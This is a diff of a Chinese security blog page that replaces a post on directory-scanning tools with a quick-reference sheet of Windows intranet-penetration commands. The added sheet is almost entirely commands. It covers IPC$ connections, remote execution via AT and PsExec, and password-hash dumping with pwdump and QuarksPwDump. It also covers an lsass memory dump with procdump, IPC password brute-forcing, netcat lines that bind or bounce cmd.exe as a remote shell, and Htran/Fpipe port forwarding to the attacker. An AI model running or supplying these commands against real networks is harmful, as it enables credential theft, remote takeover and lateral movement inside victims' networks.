@@ -4,31 +4,35 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>目录扫描 DirBuster 与 御剑 使用Demo | Anka9080&#39;s Notes</title>
+    <title>Windows内网渗透常用工具命令速记 | Anka9080&#39;s Notes</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Anka9080">
     
 
     
-    <meta name="description" content="要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。
-0x00 DirBuster　　DirBuster是Owasp(开放Web软体安全项目- Open Web Application">
+    <meta name="description" content="建立 IPC 连接（需要139 or 445 端口）：
+net use \\ip\ipc$ /user:username password
+net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
+net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
+copy c:\123.tx">
 <meta property="og:type" content="article">
-<meta property="og:title" content="目录扫描 DirBuster 与 御剑 使用Demo">
-<meta property="og:url" content="http://www.evilclay.com/2014/09/16/find-dir/index.html">
+<meta property="og:title" content="Windows内网渗透常用工具命令速记">
+<meta property="og:url" content="http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/index.html">
 <meta property="og:site_name" content="Anka9080's Notes">
-<meta property="og:description" content="要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。
-0x00 DirBuster　　DirBuster是Owasp(开放Web软体安全项目- Open Web Application">
-<meta property="og:image" content="http://images.cnitblog.com/blog/671902/201409/162109281289637.jpg">
-<meta property="og:image" content="http://images.cnitblog.com/blog/671902/201409/162103128002003.jpg">
-<meta property="og:image" content="http://images.cnitblog.com/blog/671902/201409/162114165965209.jpg">
-<meta property="og:image" content="http://images.cnitblog.com/blog/671902/201409/162123493154341.jpg">
-<meta property="og:updated_time" content="2016-05-28T07:46:43.808Z">
+<meta property="og:description" content="建立 IPC 连接（需要139 or 445 端口）：
+net use \\ip\ipc$ /user:username password
+net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
+net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
+copy c:\123.tx">
+<meta property="og:updated_time" content="2016-10-27T15:37:33.400Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="目录扫描 DirBuster 与 御剑 使用Demo">
-<meta name="twitter:description" content="要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。
-0x00 DirBuster　　DirBuster是Owasp(开放Web软体安全项目- Open Web Application">
-<meta name="twitter:image" content="http://images.cnitblog.com/blog/671902/201409/162109281289637.jpg">
+<meta name="twitter:title" content="Windows内网渗透常用工具命令速记">
+<meta name="twitter:description" content="建立 IPC 连接（需要139 or 445 端口）：
+net use \\ip\ipc$ /user:username password
+net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
+net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
+copy c:\123.tx">
 
     
     <link rel="alternative" href="/atom.xml" title="Anka9080&#39;s Notes" type="application/atom+xml">
@@ -88,14 +92,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2014/09/16/find-dir/" title="目录扫描 DirBuster 与 御剑 使用Demo" itemprop="url">目录扫描 DirBuster 与 御剑 使用Demo</a>
+      <a href="/2016/10/27/Windows内网渗透常用工具命令速记/" title="Windows内网渗透常用工具命令速记" itemprop="url">Windows内网渗透常用工具命令速记</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
 		
   <p class="article-time">
-    <time datetime="2014-09-16T06:51:58.000Z" itemprop="datePublished"> Published 2014-09-16</time>
+    <time datetime="2016-10-27T15:36:24.000Z" itemprop="datePublished"> Published 2016-10-27</time>
     
   </p>
 </header>
@@ -104,47 +108,74 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">Contents</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-DirBuster"><span class="toc-number">1.</span> <span class="toc-text">0x00 DirBuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-01-御剑"><span class="toc-number">2.</span> <span class="toc-text">0x 01 御剑</span></a></li></ol>
+			
 		
 		</div>
 		
-		<p>　　要想熟悉目标网站的体系架构，知道网站有哪些目录是必不可少的<br>向AWVS，Burp类大型扫描工具也可以进行目录扫描，不过无论是目录扫描还是SQL 注入，综合型的工具远没有专业扫描工具来的简单，实在。　期待能有一个扫描器抓扫弱点URL资源的，好像已经有白帽子在开发了。</p>
-<h2 id="0x00-DirBuster"><a href="#0x00-DirBuster" class="headerlink" title="0x00 DirBuster"></a>0x00 DirBuster</h2><p>　　DirBuster是Owasp(开放Web软体安全项目- Open Web Application Security Project )开发的一款专门用于探测Web服务器的目录和隐藏文件。由于使用Java编写，电脑中要装有JDK才能运行。DirBuster 扫描二级目录的策略有两个：1，爬行网站；2，暴力破解。</p>
-<ol>
-<li>配置说明</li>
-</ol>
-<p>点击Options—Advanced Options打开如下配置界面</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162109281289637.jpg" alt=""></p>
-<p>在这里可以设置不扫描文件类型，设置遇到表单自动登录，增加HTTP头（Cookie……），</p>
-<p>以及代理设置，超时链接设置，默认线程，字典，扩展名设置</p>
-<p>有时间的小伙伴自己捣鼓捣鼓 ，这里不多说了</p>
-<ol>
-<li>扫描测试</li>
-</ol>
-<p>本地搭建了一个Dede站，直接开撸</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162103128002003.jpg" alt=""></p>
-<p>在第4步中也可以选择纯暴力破解模式，命中率不高，相比之下还是模糊测试好用些</p>
-<p>（坏笑~）上面有一个小错误，在第7步的时候，扫目标站下的目录应该填写/DedeCms5.7/{dir} 不知道细心的小伙伴发现了没~</p>
-<p>否则的话扫的就是127.0.0.1：8080下的目录了</p>
-<ol>
-<li>扫描结果</li>
-</ol>
-<p>这是本地扫描目录列表，点击TreeView可以自己查看目录树</p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162114165965209.jpg" alt=""></p>
-<p>　　　　　　</p>
-<h2 id="0x-01-御剑"><a href="#0x-01-御剑" class="headerlink" title="0x 01 御剑"></a>0x 01 御剑</h2><p>　　国内第一后台扫描神器,不用配置，御剑只会做字典扫描，不做爬虫扫描，填上网站，只需要点一下就够了，上图 </p>
-<p><img src="http://images.cnitblog.com/blog/671902/201409/162123493154341.jpg" alt=""></p>
-<p>简单粗暴，适合使用，期待御剑的其他作品。</p>
-<p><strong> Summary： </strong></p>
-<p>前面文章已经说过了，对于目录扫描我们可以手动查看robots.txt，说不定后台就放在里面。</p>
-<p>还是那句话，一个扫描器扫描结果不理想时，我们大可以两个扫描器一起上。工具是死的，要学会灵活使用 !</p>
-<p>一般来说一个靠谱的目录扫描器可以从两方面入手：</p>
-<ul>
-<li>爬行本网站以及搜索引擎的相关URL并做去重处理</li>
-<li>找一个靠谱的字典去做 fuzzing</li>
-</ul>
-<p>子域名探测和目录扫描的思路是一样的，对于子域名探测可以写个爬虫爬取专门探测子域名网站上的结果。</p>
-  
+		<p>建立 IPC 连接（需要139 or 445 端口）：</p>
+<pre><code>net use \\ip\ipc$ /user:username password
+net use \\ip\ipc$ /del        // 关闭与 IP 已经建立的 IPC 连接
+net use z: \\ip\C$            // 对已经建立 IPC 连接的IP 映射 C 盘为 本地 Z盘
+copy c:\123.txt \\ip\C$\111\     // 把本地 123.txt 复制到对方 C 盘 111 目录下
+net view \\ip            // 显示远程主机的共享
+net share        // 查看本地已开启的共享
+net share ipc$  // 本机开启 IPC 服务
+</code></pre><p>AT 计划任务：</p>
+<pre><code>net time \\ip        // 查看 远程 IP 上的系统时间
+at \\ip 时间 程序名 or 系统命令
+</code></pre><p>PsExec :</p>
+<pre><code>PsExec \\&lt;ip&gt; -u user -p pass cmd
+</code></pre><p>PwDump:</p>
+<pre><code>pwdump7.exe (Dump system passwords)
+pwdump7.exe -s (Dump passwords from files)
+pwdump7.exe -d [sourcefile] [destionation] (Copy filename to destionation) // 可以复制进程调用的文件
+pwdump7.exe -h (Show this help)
+pwdump6.exe -x &lt;dst_ip&gt; // 需要与 dst_ip 建立 IPC 通道，而且是pwdump6版本有这个功能
+</code></pre><p>NC:</p>
+<pre><code>nc 192.168.1.1 5678　　连接.100的5678端口
+nc -vv -lp  22222 -t -e cmd.exe   监听本地22222端口并反弹CMD
+
+nc -vv -lp 23333 // 监听 本地23333端口
+nc 192.16.1.1 23333 -t -e cmd  // 连接远程23333端口并绑定 CMD
+</code></pre><p>GetPass:</p>
+<pre><code>//  闪电小子 根据 minikatz 编译的工具，分为32位和64位，可以直接过去明文密码。
+</code></pre><p>QuarksPwDump</p>
+<pre><code>// 支持 Windows XP / 2003 / Vista / 7 / 2008 / 8
+QuarksPwDump.exe -dhl  // 抓取本地 hash
+QuarksPwDump.exe -k   // 获得系统秘钥
+</code></pre><p>ProcDump：</p>
+<pre><code>// lsass.exe 是Windows安全策略，权威域认证，AD管理的关键组件
+procdump.exe -accepteula -ma lsass.exe lsass.dmp  // 下载内存文件到本地
+</code></pre><p>IPC批处理爆破：</p>
+<pre><code>ipc_crack.bat IP Username Passwordfile.txt
+</code></pre><p>hscan：</p>
+<pre><code>hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -ftp        //  使用FTP弱点模块探测
+hscan.exe -h &lt;start_ip&gt; &lt;end_ip&gt; -all        //  加载所有弱点模块探测
+</code></pre><p>ftpscan：</p>
+<pre><code>ftpscan.exe &lt;start_ip&gt;-&lt;end_ip&gt; 200            // 开启200线程扫描制定 IP 段
+                                            // 使用的是默认字典 username.dic password.dic
+</code></pre><p>Port2Port：</p>
+<pre><code>Port2Port.exe 2333 &lt;ip&gt; port                    // 把 本地 2333 端口转发到 远程 port
+</code></pre><p>铁鹰PortTransfer：</p>
+<pre><code>PortTransfer.exe -listen  &lt;本地 监听端口&gt;  &lt;本地 反弹端口&gt;
+PortTransfer.exe -remote &lt;远程 IP&gt; &lt;远程 端口&gt; 127.0.0.1 &lt;本地 监听端口&gt;
+</code></pre><p>Fpipe:</p>
+<pre><code>在跳板机上运行：fpipe -l 81 -r 22 &lt;远程IP&gt;
+//把 远程IP 的 22 端口映射到跳板机 81端口，默认使用高端口转发流量。
+
+或者：
+
+在跳板机上运行：fpipe -l 81 -s 82 -r 22 &lt;远程IP&gt;
+//把 远程IP 的 22 端口映射到跳板机 81端口，并且指定82端口来转发流量。
+</code></pre><p>Htran:</p>
+<pre><code>HTran2.4.exe -p -Listen 11111 22222
+// 攻击端 IP 执行
+// 开启 11111 22222 端口 并把 11111 的流量转发给 22222
+
+HTran2.4.exe -p -slave &lt;攻击端 IP&gt; 11111 127.0.0.1 3389
+// 被攻击端IP 执行
+// 把 本地 3389 端口转发到 攻击机 的 11111端口
+</code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -152,7 +183,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/安全工具/">安全工具</a><a href="/tags/DirBuster/">DirBuster</a><a href="/tags/御剑/">御剑</a><a href="/tags/目录扫描/">目录扫描</a>
+  <span></span> <a href="/tags/内网渗透/">内网渗透</a><a href="/tags/安全工具/">安全工具</a>
   </div>
 
 </div>
@@ -161,7 +192,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://www.evilclay.com/2014/09/16/find-dir/" data-title="目录扫描 DirBuster 与 御剑 使用Demo | Anka9080&#39;s Notes" data-tsina="null" class="share clearfix">
+	  <div data-url="http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/" data-title="Windows内网渗透常用工具命令速记 | Anka9080&#39;s Notes" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -174,19 +205,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2014/09/17/nmap/" title="Nmap 端口扫描利器">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Nmap 端口扫描利器</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2014/09/15/GoogleHacking/"  title="GoogleHacking ，搜你想要的">
+<a href="/2016/10/11/XML外部实体注入（XXE）漏洞分析及漏洞场景探索/"  title="XML外部实体注入（XXE）漏洞分析及漏洞场景探索">
  <strong>下一篇：</strong><br/> 
- <span>GoogleHacking ，搜你想要的
+ <span>XML外部实体注入（XXE）漏洞分析及漏洞场景探索
 </span>
 </a>
 </div>
@@ -195,7 +218,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2014/09/16/find-dir/" data-title="目录扫描 DirBuster 与 御剑 使用Demo" data-url="http://www.evilclay.com/2014/09/16/find-dir/"></div>
+	<div class="ds-thread" data-thread-key="2016/10/27/Windows内网渗透常用工具命令速记/" data-title="Windows内网渗透常用工具命令速记" data-url="http://www.evilclay.com/2016/10/27/Windows内网渗透常用工具命令速记/"></div>
 </section>
 
 
@@ -205,7 +228,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">Contents</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-DirBuster"><span class="toc-number">1.</span> <span class="toc-text">0x00 DirBuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-01-御剑"><span class="toc-number">2.</span> <span class="toc-text">0x 01 御剑</span></a></li></ol>
+ 
  
   </div>
 
